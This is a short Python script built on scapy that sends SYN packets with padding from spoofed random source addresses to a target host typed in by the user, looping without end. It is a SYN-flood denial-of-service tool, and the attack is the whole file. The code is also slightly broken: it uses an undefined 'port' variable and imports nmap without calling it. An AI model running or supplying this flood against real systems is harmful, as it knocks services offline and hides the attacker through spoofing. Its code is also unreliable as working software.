import nmap
from scapy.all import*
target_host = input("Choose target")
target_port = "1-1000"
udp_port = []

ip = IP(src=RandIP(), dst=target_host)
tcp = TCP(sport=RandShort(), dport=port, flags="S")
raw = Raw(b"X"*1024)

p = ip / tcp / raw
send(p,loop = 1, verbose = 1)